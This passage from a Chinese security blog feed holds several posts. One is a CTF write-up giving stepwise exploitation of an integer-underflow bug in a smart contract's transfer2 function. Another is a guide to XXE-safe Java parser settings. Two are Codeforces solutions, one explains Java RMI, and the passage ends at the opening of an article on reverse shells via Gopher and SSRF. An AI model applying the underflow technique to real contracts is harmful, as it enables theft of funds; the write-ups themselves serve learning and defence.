<p><img src="/posts/3073343310/image-20200403112503789.png" alt="image-20200403112503789"></p>
<p>0x00为balanceOf，0x01为gift，0x02为owner地址。此时源码没有更多有价值信息，开始审计逆向出来的代码。接下来分析每一个函数。</p>
<p>2.func_01DC()</p>
<p><img src="/posts/3073343310/image-20200403113351408.png" alt="image-20200403113351408"></p>
<p>未解析出名字的函数，逻辑就是gift=0时，则balanceOf+1，且gift置为1。即空投函数。</p>
<p>3.profit()</p>
<p><img src="/posts/3073343310/image-20200403134757106.png" alt="image-20200403134757106"></p>
<p>profit函数，逻辑就是balanceOf和gift都必须为1，则balanceOf+1，且gift置为2。</p>
<p>4.transfer(var arg0, var arg1)</p>
<p><img src="/posts/3073343310/image-20200403140503970.png" alt="image-20200403140503970"></p>
<p>从函数名就能看出来是转账函数，且易知arg0为收款账户，arg1位转账金额。大致逻辑如下。首先要求arg1不能&lt;=1，balanceOf也不能&lt;=1，arg1要&lt;=balanceof，然后就是标准转账函数，当前账户-arg1，收款账户+arg1。</p>
<p>5.transfer2(var arg0, var arg1)</p>
<p><img src="/posts/3073343310/image-20200403140916019.png" alt="image-20200403140916019"></p>
<p>最后一个函数，看函数名也是一个转账函数，也且易知arg0为收款账户，arg1位转账金额。但肯定有所区别。大致逻辑如下。首先要求arg1不能&lt;=2，balanceOf不能&lt;=2，<strong>balanceOf-arg1不能&lt;=0</strong>，然后就是标准转账函数，当前账户-arg1，收款账户+arg1。这个transfer2函数与上一个函数的重要区别就在于<strong>balanceOf-arg1不能&lt;=0</strong>这一步判断不同。其实二者在<strong>storage[temp0] = storage[temp0] - temp1;</strong>这一步的当前账户减arg1都有整数下溢漏洞。而transfer的判断是arg1和balanceOf直接比大小，而transfer2里是用二者相减再比大小那么如果设置arg1比较大，又由于balanceOf为<strong>uint</strong>型，所以减完balanceOf-arg1会是一个非常大的数，显然会大于0。这里即漏洞利用点。虽然transfer2还有余额大于2的要求，但是通过上面的transfer就可以实现</p>
<p>6.漏洞利用过程</p>
<ul>
<li>所以先准备两个钱包地址（Addr1和Addr2）</li>
<li>然后两个地址都执行一遍func_01DC()和profit()，这样两个地址的balanceOf都为2，且gift也为2</li>
<li>用Addr1调用transfer函数向Addr2转账2，此时Addr1余额为0，Addr2余额为4</li>
<li>之后Addr2调用transfer2函数向Addr1转一个非常大的金额即可。此时两个地址的balanceOf都会非常大，Addr2是因为余额减法下溢造成，Addr1是因为转账数额下溢造成。</li>
</ul>
<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>2019CTF</category>
      </categories>
      <tags>
        <tag>全面大学生信息安全竞赛</tag>
        <tag>2019CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA常见的XXE漏洞写法和防御转载</title>
    <url>/posts/2294213728/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>
版权声明：本文为博主「Spoock」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：[Spoock's Blog | JAVA常见的XXE漏洞写法和防御](http://blog.spoock.com/2018/10/23/java-xxe/)
### 1.漏洞本质

<p>　　本质上xxe的漏洞都是因为对xml解析时允许引用外部实体，从而导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。</p>
<h3 id="2-主要内容"><a href="#2-主要内容" class="headerlink" title="2.主要内容"></a>2.主要内容</h3><h4 id="2-1-主要漏洞及原因"><a href="#2-1-主要漏洞及原因" class="headerlink" title="2.1 主要漏洞及原因"></a>2.1 主要漏洞及原因</h4><p>　　apache OFBiz中的XML解析是由UtilXml.java中readXmlDocument()完成，DocumentBuilderFactory设置不当，OFBiz为开源电子商务平台；<br>　　JavaMelody中是由PayloadNameRequestWrapper.java中的parseSoapMethodName来解析XML，XMLStreamReader没有限制外部查询，JavaMelody属于java应用程序监控；<br>　　微信支付SDK的XXE漏洞和Spring-data-XMLBean XXE漏洞都是是使用了DocumentBuilderFactory没有限制外部查询而导致XXE。</p>
<h4 id="2-2-具体类库正确使用方法"><a href="#2-2-具体类库正确使用方法" class="headerlink" title="2.2 具体类库正确使用方法"></a>2.2 具体类库正确使用方法</h4><p>DocumentBuilderFactory：注意代码先后顺序。<br>DocumentBuilder builder = dbf.newDocumentBuilder();<br>这行代码需要在dbf.setFeature()之后才能够生效；</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">String FEATURE = null;</span><br><span class="line">FEATURE = "http://javax.xml.XMLConstants/feature/secure-processing";</span><br><span class="line">dbf.setFeature(FEATURE, true);</span><br><span class="line">FEATURE = "http://apache.org/xml/features/disallow-doctype-decl";</span><br><span class="line">dbf.setFeature(FEATURE, true);</span><br><span class="line">FEATURE = "http://xml.org/sax/features/external-parameter-entities";</span><br><span class="line">dbf.setFeature(FEATURE, false);</span><br><span class="line">FEATURE = "http://xml.org/sax/features/external-general-entities";</span><br><span class="line">dbf.setFeature(FEATURE, false);</span><br><span class="line">FEATURE = "http://apache.org/xml/features/nonvalidating/load-external-dtd";</span><br><span class="line">dbf.setFeature(FEATURE, false);</span><br><span class="line">dbf.setXIncludeAware(false);</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line">DocumentBuilder builder = dbf.newDocumentBuilder();</span><br><span class="line">// 读取xml文件内容</span><br><span class="line">FileInputStream fis = new FileInputStream("path/to/xxexml");</span><br><span class="line">InputSource is = new InputSource(fis);</span><br><span class="line">Document doc = builder.parse(is);</span><br></pre></td></tr></tbody></table></figure>

<p>SAXBuilder：默认设置存在XXE，需要在新建实例的时候加上true参数：<br>SAXBuilder builder = new SAXBuilder(true);<br>或者：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">SAXBuilder builder = new SAXBuilder();</span><br><span class="line">builder.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);</span><br><span class="line">builder.setFeature("http://xml.org/sax/features/external-general-entities", false);</span><br><span class="line">builder.setFeature("http://xml.org/sax/features/external-parameter-entities", false);</span><br><span class="line">builder.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);</span><br><span class="line">Document doc = builder.build(InputSource);</span><br></pre></td></tr></tbody></table></figure>

<p>SAXParserFactory：默认存在问题，需要先setFeature，正确如下：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);</span><br><span class="line">spf.setFeature("http://xml.org/sax/features/external-general-entities", false);</span><br><span class="line">spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);</span><br><span class="line">spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);</span><br><span class="line">SAXParser parser = spf.newSAXParser();</span><br><span class="line">parser.parse(InputSource, (HandlerBase) null);</span><br></pre></td></tr></tbody></table></figure>

<p>SAXReader：同上，先设置setFeature。正确如下：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">SAXReader saxReader = new SAXReader();</span><br><span class="line">saxReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);</span><br><span class="line">saxReader.setFeature("http://xml.org/sax/features/external-general-entities", false);</span><br><span class="line">saxReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);</span><br><span class="line">saxReader.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);</span><br><span class="line">saxReader.read(InputSource);</span><br></pre></td></tr></tbody></table></figure>

<p>SAXTransformerFactory：默认存在XXE。虽然在运行时会报错，当时仍然能够触发XXE，正确如下：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");</span><br><span class="line">StreamSource source = new StreamSource(InputSource);</span><br><span class="line">sf.newTransformerHandler(source);</span><br></pre></td></tr></tbody></table></figure>

<p>SchemaFactory：默认会存在XXE。虽然在运行时会报错，当时仍然能够触发XXE，正确如下：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">SchemaFactory factory = SchemaFactory.newInstance("http://www.w3.org/2001/XMLSchema");</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");</span><br><span class="line">StreamSource source = new StreamSource(InputSource);</span><br><span class="line">Schema schema = factory.newSchema(source);</span><br></pre></td></tr></tbody></table></figure>

<p>TransformerFactory：默认解析存在XXE。正确如下：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">TransformerFactory tf = TransformerFactory.newInstance();</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");</span><br><span class="line">StreamSource source = new StreamSourceInputSource);</span><br><span class="line">tf.newTransformer().transform(source, new DOMResult());</span><br></pre></td></tr></tbody></table></figure>

<p>ValidatorSample：使用默认解析的方法会存在XXE。正确如下：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">SchemaFactory factory = SchemaFactory.newInstance("http://www.w3.org/2001/XMLSchema");</span><br><span class="line">Schema schema = factory.newSchema();</span><br><span class="line">Validator validator = schema.newValidator();</span><br><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");</span><br><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");</span><br><span class="line">StreamSource source = new StreamSource(InputSource);</span><br><span class="line">validator.validate(source);</span><br></pre></td></tr></tbody></table></figure>

<p>XMLReader：使用默认的方式存在XXE。正确如下：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">XMLReader reader = XMLReaderFactory.createXMLReader();</span><br><span class="line">reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);</span><br><span class="line">reader.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);</span><br><span class="line">reader.setFeature("http://xml.org/sax/features/external-general-entities", false);</span><br><span class="line">reader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);</span><br><span class="line">reader.parse(new InputSource(InputSource));</span><br></pre></td></tr></tbody></table></figure>

<p>Unmarshaller：使用默认方式不会出现问题。（唯一不会出现问题的XML解析库）</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">Class tClass = Some.class;</span><br><span class="line">JAXBContext context = JAXBContext.newInstance(tClass);</span><br><span class="line">Unmarshaller um = context.createUnmarshaller();</span><br><span class="line">Object o = um.unmarshal(ResourceUtils.getPoc1());</span><br><span class="line">tClass.cast(o);</span><br></pre></td></tr></tbody></table></figure>

<h4 id="2-2-正确方法总结"><a href="#2-2-正确方法总结" class="headerlink" title="2.2 正确方法总结"></a>2.2 正确方法总结</h4><p>第一种：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">"http://apache.org/xml/features/disallow-doctype-decl", true</span><br><span class="line">"http://apache.org/xml/features/nonvalidating/load-external-dtd", false</span><br><span class="line">"http://xml.org/sax/features/external-general-entities", false</span><br><span class="line">"http://xml.org/sax/features/external-parameter-entities", false</span><br></pre></td></tr></tbody></table></figure>

<p>第二种：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">XMLConstants.ACCESS_EXTERNAL_DTD, ""</span><br><span class="line">XMLConstants.ACCESS_EXTERNAL_STYLESHEET, ""</span><br></pre></td></tr></tbody></table></figure>

<h3 id="3-参考文献"><a href="#3-参考文献" class="headerlink" title="3.参考文献"></a>3.参考文献</h3><ul>
<li>JAVA常见的XXE漏洞写法和防御<ul>
<li><a href="https://blog.spoock.com/2018/10/23/java-xxe/" target="_blank" rel="noopener">https://blog.spoock.com/2018/10/23/java-xxe/</a></li>
</ul>
</li>
<li>Java服务XXE漏洞防御方法<ul>
<li><a href="http://www.leadroyal.cn/?p=562" target="_blank" rel="noopener">http://www.leadroyal.cn/?p=562</a></li>
</ul>
</li>
</ul>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>技术基础</tag>
        <tag>Java基础</tag>
        <tag>漏洞挖掘</tag>
        <tag>XXE漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Codeforces164ECompatibleNumbers</title>
    <url>/posts/2626195267/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<p>版权声明：本文为CSDN博主「Bjut_Search2016」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/nyist_zxp/article/details/40020349" target="_blank" rel="noopener">https://blog.csdn.net/nyist_zxp/article/details/40020349</a></p>
<div class="htmledit_views" id="content_views">

<p><a href="http://codeforces.com/problemset/problem/165/E" target="_blank" rel="nofollow noopener">题目链接~~&gt;</a><br></p>
<p><strong>做题感悟：</strong>确实是好题，做拉的比赛的时候想了很久，想到枚举变幻某一位的 0 为 1 ，但是每个数都这样枚举岂不超时的节奏，当时没想到其实从大到小枚举一次就 ok 了。</p>
<p><strong>解题思路：</strong></p>
<p>               本题要求两个数  a &amp; b = 0 , 如果 a  =  10010 , b 至少（指在 a 中的为 1 的位必须为 0 ）是 01101 ，还可以是 00101 ，00001 ，00000。就相当于你去买东西一样，先提出你的要求（必须满足），至于其他方面都无所谓。这样我们可以枚举 b 中的 1 ，让其变为 0 ，那么，怎样枚举呢  ？ 一个一个的枚举是不可以的，肯定超时，我们可以统一枚举一下，就跟状态压缩更新状态一样，相当于递推，用动态规划的思想去优化它，每个数最多只变化
 0 的个数，然后再用变化了的数去变化。</p>
<p><strong>代码：</strong></p>

<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;sstream&gt;</span><br><span class="line">#include&lt;map&gt;</span><br><span class="line">#include&lt;cmath&gt;</span><br><span class="line">#include&lt;fstream&gt;</span><br><span class="line">#include&lt;queue&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;sstream&gt;</span><br><span class="line">#include&lt;cstring&gt;</span><br><span class="line">#include&lt;cstdio&gt;</span><br><span class="line">#include&lt;stack&gt;</span><br><span class="line">#include&lt;bitset&gt;</span><br><span class="line">#include&lt;ctime&gt;</span><br><span class="line">#include&lt;string&gt;</span><br><span class="line">#include&lt;cctype&gt;</span><br><span class="line">#include&lt;iomanip&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">using namespace std  ;</span><br><span class="line">#define INT __int64</span><br><span class="line">#define L(x)  (x * 2)</span><br><span class="line">#define R(x)  (x * 2 + 1)</span><br><span class="line">const int INF = 0x3f3f3f3f ;</span><br><span class="line">const double esp = 0.0000000001 ;  </span><br><span class="line">const double PI = acos(-1.0) ;</span><br><span class="line">const INT mod = 1e9 + 7 ;</span><br><span class="line">const int MY = 15 ;</span><br><span class="line">const int MX = (1&lt;&lt;22) + 5 ;</span><br><span class="line">int n ;</span><br><span class="line">int dp[MX] ,g[MX] ;</span><br><span class="line">int main()</span><br><span class="line">{</span><br><span class="line">    //freopen("input.txt" ,"r" ,stdin) ;</span><br><span class="line">    while(~scanf("%d" ,&amp;n))</span><br><span class="line">    {</span><br><span class="line">        int S = (1&lt;&lt;22) - 1 ;</span><br><span class="line">        memset(dp ,0 ,sizeof(dp)) ;</span><br><span class="line">        for(int i = 0 ;i &lt; n ; ++i)</span><br><span class="line">        {</span><br><span class="line">            scanf("%d" ,&amp;g[i]) ;</span><br><span class="line">            dp[g[i]^S] = g[i] ;  //  g[I] 需要的另一半</span><br><span class="line">        }</span><br><span class="line">        for(int i = S ; i &gt;= 0 ; --i)  // 枚举各种状态</span><br><span class="line">        {</span><br><span class="line">            if(!dp[i])  // 如果没有存值</span><br><span class="line">            {</span><br><span class="line">                for(int j = 0 ;j &lt; 22 ; ++j)  // 给其添加 1 让其变成有值</span><br><span class="line">                   if(dp[i|(1&lt;&lt;j)])</span><br><span class="line">                       dp[i] = dp[i|(1&lt;&lt;j)] ;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        for(int i = 0 ;i &lt; n ; ++i)</span><br><span class="line">        {</span><br><span class="line">            if(i)  cout&lt;&lt;" " ;</span><br><span class="line">            if(dp[g[i]])   cout&lt;&lt;dp[g[i]] ;</span><br><span class="line">            else           cout&lt;&lt;"-1" ;</span><br><span class="line">        }</span><br><span class="line">        cout&lt;&lt;endl ;</span><br><span class="line">    }</span><br><span class="line">    return 0 ;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

</div><script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>技术基础</category>
      </categories>
      <tags>
        <tag>技术基础</tag>
        <tag>ACM算法</tag>
        <tag>Codeforces164</tag>
        <tag>Bjut_Search2016</tag>
      </tags>
  </entry>
  <entry>
    <title>Codeforces385CBearandPrimeNumbers</title>
    <url>/posts/1795814039/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<p>版权声明：本文为CSDN博主「Bjut_Search2016」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/nyist_zxp/article/details/40020349" target="_blank" rel="noopener">https://blog.csdn.net/nyist_zxp/article/details/40020349</a></p>
<p><a href="http://codeforces.com/problemset/problem/385/C" target="_blank" rel="nofollow noopener">题目链接~~&gt;</a><br></p>
<p><strong>做题感悟：</strong>这题属于想法题，比赛时直接做的 D 题，但是处理坐标处理的头晕眼花的，结果到最后也没AC。</p>
<p><strong>解题思路：</strong></p>
<p>        因为查询的时候只考虑素数，so~我们只考虑素数就可以，这就需要筛素数，我们可以在筛素数的同时把某个素数出现的倍数加上，输入的时候只要记录某个数的个数就可以了。</p>
                                    <p><strong>代码：</strong></p>

<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;sstream&gt;</span><br><span class="line">#include&lt;map&gt;</span><br><span class="line">#include&lt;cmath&gt;</span><br><span class="line">#include&lt;fstream&gt;</span><br><span class="line">#include&lt;queue&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;sstream&gt;</span><br><span class="line">#include&lt;cstring&gt;</span><br><span class="line">#include&lt;cstdio&gt;</span><br><span class="line">#include&lt;stack&gt;</span><br><span class="line">#include&lt;bitset&gt;</span><br><span class="line">#include&lt;ctime&gt;</span><br><span class="line">#include&lt;string&gt;</span><br><span class="line">#include&lt;iomanip&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">using namespace std  ;</span><br><span class="line">#define INT long long int</span><br><span class="line">const int INF = 0x3f3f3f ;</span><br><span class="line">const double esp = 0.0000000001 ;</span><br><span class="line">const double PI = acos(-1.0) ;</span><br><span class="line">const int mod = 1000000007 ;</span><br><span class="line">const int MY = 100 + 5 ;</span><br><span class="line">const int MX = 10000000 + 5 ;</span><br><span class="line">int Max ,n ,m ;</span><br><span class="line">bool isprime[MX] ;</span><br><span class="line">int sum[MX] ,num[MX] ;</span><br><span class="line">void init() // 筛法同时记录个数</span><br><span class="line">{</span><br><span class="line">    memset(isprime ,false ,sizeof(isprime)) ;</span><br><span class="line">    memset(sum ,0 ,sizeof(sum)) ;</span><br><span class="line">    for(int i = 2 ;i &lt;= Max ; ++i)</span><br><span class="line">    {</span><br><span class="line">        sum[i] += sum[i-1] ;</span><br><span class="line">        if(!isprime[i])</span><br><span class="line">        {</span><br><span class="line">            sum[i] += num[i] ;</span><br><span class="line">            for(int j = i + i ;j &lt;= Max ; j += i)</span><br><span class="line">            {</span><br><span class="line">                sum[i] += num[j] ;</span><br><span class="line">                isprime[j] = true ;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">int main()</span><br><span class="line">{</span><br><span class="line">    int x ;</span><br><span class="line">    while(~scanf("%d" ,&amp;n))</span><br><span class="line">    {</span><br><span class="line">        memset(num ,0 ,sizeof(num)) ;</span><br><span class="line">        Max = 0 ;</span><br><span class="line">        for(int i = 0 ;i &lt; n ; ++i)</span><br><span class="line">        {</span><br><span class="line">            scanf("%d" ,&amp;x) ;</span><br><span class="line">            num[x]++ ;         // 记录个数</span><br><span class="line">            Max = max(Max ,x) ;</span><br><span class="line">        }</span><br><span class="line">        init() ;</span><br><span class="line">        scanf("%d" ,&amp;m) ;</span><br><span class="line">        int le ,rt ;</span><br><span class="line">        for(int i = 0 ;i &lt; m ; ++i)</span><br><span class="line">        {</span><br><span class="line">            scanf("%d%d" ,&amp;le ,&amp;rt) ;</span><br><span class="line">            if(rt &gt; Max)  rt = Max ;</span><br><span class="line">            if(le &gt; Max)  cout&lt;&lt;"0"&lt;&lt;endl ;</span><br><span class="line">            else      cout&lt;&lt;sum[rt]-sum[le-1]&lt;&lt;endl ;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    return 0 ;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>技术基础</category>
      </categories>
      <tags>
        <tag>技术基础</tag>
        <tag>ACM算法</tag>
        <tag>Codeforces164</tag>
        <tag>Bjut_Search2016</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaRMI理念在Dubbo中的应用之JavaRMI转载</title>
    <url>/posts/2213029462/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<h2 id="什么是Java-RMI"><a href="#什么是Java-RMI" class="headerlink" title="什么是Java RMI"></a>什么是Java RMI</h2><p>　　RMI就是远程方法调用，通俗点讲，就是一种能够实现客户端调用服务端对象方法的远程调用技术，通过这种技术，客户端访问远程服务端的方法就感觉像是在本地调用自己的方法一样简单。<br>　　官方给出的关于Java RMI 的基本概念如下：Java RMI（Remote Method Invocation）- 远程方法调用，能够让客户端像使用本地调用一样调用服务端 Java 虚拟机中的对象方法。RMI 是面向对象语言领域对 RPC （Remote Procedure Call）的完善，用户无需依靠 IDL 的帮助来完成分布式调用，而是通过依赖接口这种更简单自然的方式。</p>
<h2 id="RMI工作原理"><a href="#RMI工作原理" class="headerlink" title="RMI工作原理"></a>RMI工作原理</h2><p>一种典型的RMI调用如下图所示：<br>　1. 服务端向RMI注册服务绑定自己的地址，<br>　2. 客户端通过RMI注册服务获取目标地址，<br>　3. 客户端调用本地的Stub对象上的方法，和调用本地对象上的方法一致，<br>　4. 本地存根对象将调用信息打包，通过网络发送到服务端，<br>　5. 服务端的Skeleton对象收到网络请求之后，将调用信息解包，<br>　6. 找到真正的服务对象发起调用，并将返回结果打包通过网络发送回客户端。<br><img src="http://dubbo.apache.org/img/blog/rmi-flow.png" alt="RMI Flow"></p>
<h2 id="RMI示例代码"><a href="#RMI示例代码" class="headerlink" title="RMI示例代码"></a>RMI示例代码</h2><h4 id="服务端注册代码"><a href="#服务端注册代码" class="headerlink" title="服务端注册代码"></a>服务端注册代码</h4><figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">Hello obj = new HelloImpl(); // #1</span><br><span class="line">Hello stub = (Hello) UnicastRemoteObject.exportObject(obj, 0); // #2</span><br><span class="line">Registry registry = LocateRegistry.createRegistry(1099); // #3</span><br><span class="line">registry.rebind("Hello", stub); // #4</span><br></pre></td></tr></tbody></table></figure>

<p>说明：<br>　　1.初始化服务对象实例<br>　　2.通过<em>UnicastRemoteObject.exportObject*生成可以与服务端通讯的Stub对象，<br>　　3.创建一个本地的RMI注册服务，监听端口为1099。该注册服务运行在服务端，也可以单独启动一个注册服务的进程，<br>　　4.将Stub对象绑定到注册服务上，这样，客户端可以通过 *Hello</em> 这个名字查找到该远程对象。</p>
<h4 id="客户端的服务发现"><a href="#客户端的服务发现" class="headerlink" title="客户端的服务发现"></a>客户端的服务发现</h4><figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">Registry registry = LocateRegistry.getRegistry(); // #1</span><br><span class="line">Hello stub = (Hello) registry.lookup("Hello"); // #2</span><br><span class="line">String response = stub.sayHello(); // #3</span><br></pre></td></tr></tbody></table></figure>

<p>说明：</p>
<ol>
<li>获取注册服务实例，在本例中，由于没有传入任何参数，假定要获取的注册服务实例部署在本机，并监听在 1099 端口上，</li>
<li>从注册服务中查找服务名为 <em>Hello</em> 的远程对象，</li>
<li>通过获取的 Stub 对象发起一次 RMI 调用并获得结果。</li>
</ol>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>技术基础</category>
      </categories>
      <tags>
        <tag>技术基础</tag>
        <tag>Java基础</tag>
        <tag>ApacheDubbo</tag>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>极客思路之0.Gopher协议+SSRF实现反弹shell（转）</title>
    <url>/posts/3310928381/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<p>版权声明：本文为博主「margine」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://zhuanlan.zhihu.com/p/112055947" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/112055947</a></p>
<h2 id="本文主要内容："><a href="#本文主要内容：" class="headerlink" title="本文主要内容："></a>本文主要内容：</h2><ol>
<li>什么是gopher协议?</li>
<li>如何使用gopher协议反弹shell？</li>
<li>在SSRF中如何使用gopher协议反弹shell?</li>
</ol>
<h2 id="一、什么是gopher协议？"><a href="#一、什么是gopher协议？" class="headerlink" title="一、什么是gopher协议？"></a>一、什么是gopher协议？</h2><p><strong>定义</strong>：Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p>
<blockquote>
<p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p>
</blockquote>
<p><strong>限制</strong>：gopher协议在各个编程语言中的使用限制</p>
